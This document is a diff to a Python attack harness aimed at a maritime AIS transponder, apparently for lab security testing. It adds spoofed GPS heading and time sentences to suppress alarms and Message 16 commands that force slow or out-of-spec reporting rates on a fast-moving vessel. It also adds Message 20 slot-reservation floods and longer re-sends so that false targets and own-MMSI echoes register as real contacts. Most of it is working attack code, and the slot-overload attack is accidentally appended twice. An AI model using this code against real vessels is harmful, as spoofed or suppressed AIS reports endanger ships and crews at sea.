@@ -69,7 +69,14 @@ class GpsFeed(threading.Thread):
                                       f"{self.course:.1f}",d,'','','A'))
         vtg = pynmea2.VTG('GP','VTG',(f"{self.course:.1f}",'T','','M',
                                       f"{self.speed:.1f}",'N',f"{self.speed*1.852:.1f}",'K','A'))
-        return (gga, rmc, vtg)
+        # HDT (true heading, from a heading device 'HE') and ZDA (explicit UTC date/time) are
+        # added so the unit stops raising "Heading lost/inv" and "UTC sync invalid" alarms -- in
+        # the em-trak run those swamped the alert channel and hid any attack-specific alarm.
+        # (A "No valid COG" alarm is separate: it clears once the victim has a nonzero SOG.)
+        hdt = pynmea2.HDT('HE','HDT',(f"{self.course:.1f}",'T'))
+        zda = pynmea2.ZDA('GP','ZDA',(t, now.strftime('%d'), now.strftime('%m'),
+                                      now.strftime('%Y'), '00', '00'))
+        return (gga, rmc, vtg, hdt, zda)
 
     def run(self):
         self.ser = serial.Serial(self.port, self.baud, timeout=1)
@@ -292,7 +299,31 @@ def build_phase2(ctx):
         [(p3enc.m16_rate_assignment(BASE_MMSI, V, 600),
           "M16 from BASE: force MAX reporting rate (600/10min) -> over-report")]))
 
-    # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging)
+    # 4b) SOLAS speed-vs-rate VIOLATION: the victim is driven FAST (main sets its SOG high), so
+    #    M.1371 autonomous rate should be ~2s. We then assign the SLOWEST rate (20/10min = 1 per
+    #    30s). A conformant unit takes the HIGHER (autonomous fast) rate and ignores this; a unit
+    #    that obeys it under-reports a fast-moving vessel -> the ship appears at stale, jumpy
+    #    positions to others (a real SOLAS reporting violation).
+    p2.append(("p2_slow_rate_while_fast",
+        [(p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
+          "M16 from BASE: assign SLOW rate (1/30s) while victim moves FAST -> SOLAS violation")]))
+
+    # 4c) BEYOND-SPEC rate values (a conformant unit clamps these): rate 0 (silence?) and a rate
+    #    past the 600 maximum. Obeying an out-of-range value is itself a finding.
+    p2.append(("p2_rate_zero",
+        [(p3enc.m16_rate_raw(BASE_MMSI, V, 0),
+          "M16 from BASE: rate=0 reports/10min (beyond-spec -> silence?)")]))
+    p2.append(("p2_rate_overmax",
+        [(p3enc.m16_rate_raw(BASE_MMSI, V, 1000),
+          "M16 from BASE: rate=1000/10min (beyond the 600 max, beyond-spec)")]))
+
+    # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging). Distinctive,
+    #    patterned reservations so a comm-state shift in the victim's reports is attributable.
+    p2.append(("p2_slot_overload",
+        [(p3enc.m20_datalink(BASE_MMSI, offset=0, number=15, timeout=7, increment=0),
+          "M20 from BASE: reserve 15 slots (max block)"),
+         (p3enc.m20_datalink(BASE_MMSI, offset=200, number=15, timeout=7),
+          "M20 from BASE: reserve 15 more slots")]))
     p2.append(("p2_slot_overload",
         [(p3enc.m20_datalink(BASE_MMSI, offset=0, number=15, timeout=7, increment=0),
           "M20 from BASE: reserve 15 slots (max block)"),
@@ -428,7 +459,13 @@ def main():
     ap.add_argument("--settle", type=float, default=60.0,
                     help="seconds to feed GPS before starting attacks (let it get a fix)")
     ap.add_argument("--repeat", type=int, default=3,
-                    help="send each attack's messages this many times (persistence)")
+                    help="legacy burst count when --accept-dwell is 0 (persistence)")
+    ap.add_argument("--accept-dwell", type=float, default=8.0,
+                    help="phase-1 persistence: seconds to keep re-sending each attack at the AIS "
+                         "cadence so a false target / own-MMSI echo registers as a real contact "
+                         "instead of a dropped transient. Set 0 to use the old repeatx0.8 burst.")
+    ap.add_argument("--accept-cadence", type=float, default=2.0,
+                    help="seconds between re-sends within --accept-dwell (2s = the fast AIS rate)")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -479,7 +516,8 @@ def main():
             victim_lat=ctx.victim_lat, victim_lon=ctx.victim_lon,
             victim_speed=gps.speed, **(extra or {}))
         print(f"[{tag}{idx+1}/{total}] {name} @ {time.strftime('%H:%M:%S')}")
-        for r in range(args.repeat):
+
+        def _send_once(r):
             for (bits, meta) in payloads:
                 if any(c not in "01" for c in bits):
                     rec(event="skip_bad", name=name, meta=meta); continue
@@ -493,7 +531,19 @@ def main():
                 rec(event="sent", name=name, rep=r, meta=meta, bits_len=len(bits),
                     src_mmsi=src_mmsi, mtype=mtype)
                 print(f"      -> {meta}")
-                time.sleep(0.8)
+
+        # Persistence: a single (or 3-burst) reception can be dropped as a transient, so a
+        # false target / own-MMSI echo only registers reliably if it reports at the AIS cadence
+        # across a dwell -- the same reason the serial acceptance probes now repeat. Spread the
+        # sends over --accept-dwell at --accept-cadence; fall back to the old repeatx0.8 burst
+        # only if the dwell is disabled (--accept-dwell 0).
+        if args.accept_dwell > 0:
+            end = time.time() + args.accept_dwell; r = 0
+            while time.time() < end:
+                _send_once(r); r += 1; time.sleep(args.accept_cadence)
+        else:
+            for r in range(args.repeat):
+                _send_once(r); time.sleep(0.8)
         rec(event="attack_end", name=name)
 
     try:
@@ -510,8 +560,18 @@ def main():
             print("     slot/TDMA overload -- may disrupt the transponder)\n")
             rec(event="phase2_start", n=len(p2), gap=args.phase2_gap)
             for i, (name, payloads) in enumerate(p2):
-                # p2_force_fast_rate is run with the victim ANCHORED (slow autonomous rate),
-                # so if the unit obeys the M16 its transmit rate jumps visibly above baseline.
+                # p2_force_fast_rate runs with the victim ANCHORED (slow autonomous rate), so if
+                # the unit obeys the M16 its transmit rate jumps visibly above baseline.
+                # p2_slow_rate_while_fast is the opposite: drive the victim FAST first so its
+                # autonomous rate is high; if it then obeys a SLOW assignment it under-reports a
+                # fast vessel (SOLAS violation). Keep it fast through the dwell, restore after.
+                if name == "p2_slow_rate_while_fast":
+                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
+                                     speed=args.fast_speed, course=90.0)
+                    rec(event="victim_speed_set", speed=args.fast_speed,
+                        note="fast so a slow-rate assignment would violate SOLAS speed/rate")
+                    print(f"    (victim SOG set to {args.fast_speed}kn; letting fast reports establish)")
+                    time.sleep(8)
                 fire(name, payloads, i, len(p2), tag="P2:")
                 if i < len(p2) - 1:
                     # recovery commands follow their retune attempt QUICKLY (short gap)
@@ -523,6 +583,9 @@ def main():
                     else:
                         print(f"    ...{args.phase2_gap}s gap (watch for disruption)...")
                         time.sleep(args.phase2_gap)
+                if name == "p2_slow_rate_while_fast":       # restore anchored baseline afterward
+                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
+                    rec(event="victim_speed_set", speed=0.0, note="restored after SOLAS rate test")
 
             # final safety recovery: no matter what, end by restoring AIS channels + power
             # + clearing any rate assignment. Uses the pyais-validated encoder so recovery
